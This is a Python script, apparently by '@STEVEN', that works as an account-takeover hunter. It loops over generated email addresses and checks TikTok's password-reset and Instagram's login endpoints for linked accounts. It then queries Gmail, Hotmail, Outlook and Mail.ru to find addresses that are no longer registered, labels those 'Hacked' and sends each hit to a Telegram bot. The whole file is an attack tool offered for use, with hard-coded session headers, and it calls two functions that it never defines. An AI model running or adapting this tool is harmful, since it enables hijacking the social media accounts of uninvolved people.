import requests,os,random,json,names
from uuid import uuid4
uid = uuid4()
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
B = '\033[1;34m'
W = '\033[1;35m'
F = '\033[1;36m'
def mailru(email,mod):
 headers_6 = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
 url = 'https://account.mail.ru/api/v1/user/exists'
 data_6 = {'email': email}
 js = requests.post(url, data=data_6, headers=headers_6)
 if str(js.json()['body']['exists']) == 'False':
     mra = f"""
{mod}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {email}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
@STEVEN
        """
     print(f"{G} Hacked {mod} and Mail.ru ==> "+G+email)
     tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
     print(G+mra)
 else:
     print(S+" Not Hacked Mail.ru => "+email)
def hotmail(email,mod):
 url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
 data = ''
 headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}	
 html = requests.get(url, data=data, headers=headers).text
 if 'Neither' in html:
     mra = f"""
{mod}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {email}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
@STEVEN
        """
     print(f"{G} Hacked {mod} and HotMail ==> "+G+email)
     tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
     print(G+mra)
 else:
     print(S+" Not Hacked HotMail => "+email)
def outlook(email,mod):
 url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
 data = ''
 headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}	
 html = requests.get(url, data=data, headers=headers).text
 if 'Neither' in html:
     mra = f"""
{mod}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {email}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
@STEVEN
        """
     print(f"{G} Hacked {mod} and OutLook ==> "+G+email)
     tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
     print(G+mra)
 else:
     print(S+" Not Hacked OutLook => "+email)
def gmail(email,mod):
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	    mra = f"""
{mod}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {email}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
@STEVEN
        """
	    print(f"{G} Hacked {mod} and Gmail ==> "+G+email)
	    tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
	    print(G+mra)
        #pass
	if res.json()['status'] == 'USERNAME_UNAVAILABLE':
	    print (S+' Not Hacked Gmail ==> '+email)
def instagram(email):
 email=str(email)
 mod='InstaGram'
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@STEVEN1',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
  print(f'{G}[✓] Linked In InstaGram ==> {email}')
  if '@gmail.com' in email:
   gmail(email,mod)
  if '@yahoo.com' in email:
   yahoo(email,mod)
  if '@hotmail.com' in email:
   hotmail(email,mod)
  if '@mail.ru' in email:
   mailru(email,mod)
  if '@aol.com' in email:
   aol(email,mod)
  if '@outlook.com' in email:
   outlook(email,mod)
 if req['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
  print(f'{G}[✓] Linked In InstaGram ==> {email}')
  if '@gmail.com' in email:
   gmail(email,mod)
  if '@yahoo.com' in email:
   yahoo(email,mod)
  if '@hotmail.com' in email:
   hotmail(email,mod)
  if '@mail.ru' in email:
   mailru(email,mod)
  if '@aol.com' in email:
   aol(email,mod)
  if '@outlook.com' in email:
   outlook(email,mod)
 if req['message'] == 'The username you entered doesn&#039;t appear to belong to an account. Please check your username and try again.':
  print(f'{E}[×] Not In InstaGram ==> {email}')
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
	 print(f'{E}[×] Not In InstaGram ==> {email}')
def tiktok(email):
 mod='TikTok'
 head={'User-Agent': 'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)','X-SS-TC': '0','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','sdk-version': '1','X-SS-QUERIES': 'dGMCAr6ot3awALq2qSjedy1Vk99nIoud%2BAhHSPAsj5dyUWFbxRx0wm95EoKwwNB3VVlOMd4SzMIENA51cwBS%2Bm0N1T95yguPVZ4OunAWAs0t0bHbsPclnVdl1Uh%2BLGZVXFGTew%3D%3D','Accept-Encoding': 'gzip','Cookie': 'odin_tt=b0db11ac4955afa4589bdb09d8f8fdcf3bcdea5238d0a6e2ba7c6aaea542e8d4ff9a3f324c153df80e03ac5e29a9d411925fa05d2f300713a2295db1eeff68accf50d5ddb5abd11115077fe989cfc094; store-idc=maliva; store-country-code=iq; store-country-code-src=did','Content-Length': '647','Connection': 'keep-alive','Host': 'api2-19-h2.musical.ly' }
 data = f'''app_language=ar&manifest_version_code=2018101933&_rticket=1667150564079&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233'''
 try:
  res=requests.post('https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1667149902064&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1667149902&as=a1261b755ea4d3e04e4388&cp=be4a3c6ce5e8520fe1MkUo&mas=0149d8edb9a3340aacd5c82fcadadde3801c1ccc2ca62c0ca6cc26',data=data,headers=head).text
  if 'Sent successfully' in res:
   print(f'{G}[✓] Linked In TikTok ==> {email}')
   if '@gmail.com' in email:
    gmail(email,mod)
   if '@yahoo.com' in email:
    yahoo(email,mod)
   if '@hotmail.com' in email:
    hotmail(email,mod)
   if '@mail.ru' in email:
    mailru(email,mod)
   if '@aol.com' in email:
    aol(email,mod)
   if '@outlook.com' in email:
    outlook(email,mod)
  else:
   print(f'{E}[×] Not In TikTok ==> {email}')
 except:
  print(f'{E}[×] Not In TikTok ==> {email}')
 instagram(email)
os.system('clear')
print(f'''{G} _    _ _     _                     
{G}|____ _____ _______     _______ _   _ 
{G}|/ ___|_   _| ____\ \   / / ____| \ | |
{G}|\___ \ | | |  _|  \ \ / /|  _| |  \| |
 {G}|___) || | | |___  \ V / | |___| |\  |
{G}||____/ |_| |_____|  \_/  |_____|_| \_|     
{G}[G] GitHub    : {B}@STEVEN
{G}[I] InstaGram : {B}@just_steven-0
{G}[F] FaceBook  : {B}@Mahmoud karem
{G}[T] TeleGram  : {B}@Mahmoudkarem1
{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==''')
name=input(f'{E}[{G}${E}] {S}Enter {G}Name {S}={F}={G}> {W}')
print(f'{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==')
rng=input(f'{E}[{G}${E}] {S}NumBers {G}After {F}Name {S}={F}={G}> {W}')
rng=int(rng)
print(f'{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==')
domain=input(f'''{E}[01] @gmail.com
{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==
{S}[02] @hotmail.com
{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==
{B}[03] @outlook.com
{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==
{G}[04] @mail.ru
{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==
{E}[{G}${E}] {F}Choose {S}={F}={G}> {W}''')
if domain == '01' or domain == '1':
 domain='@gmail.com'
if domain == '02' or domain == '2':
 domain='@hotmail.com'
if domain == '03' or domain == '3':
 domain='@outlook.com'
if domain == '04' or domain == '4':
 domain='@mail.ru'
print(f'{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==')
ID=input(f'{E}[{G}${E}] {S}TeleGram {G}ID {S}={F}={G}> {W}')
print(f'{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==')
tok=input(f'{E}[{G}${E}] {S}TeleGram {G}BOT {F}Token {S}={F}={G}> {W}')
print(f'{S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}=={S}=={G}=={E}=={F}=={W}=={B}==')
while True:
 n = '1234567890'
# rn='1234'
# rng = random.choice(rn)
# rng = int(rng)
 user = str(''.join(random.choice(n)for i in range(rng)))
 email=name+user+domain
 tiktok(email)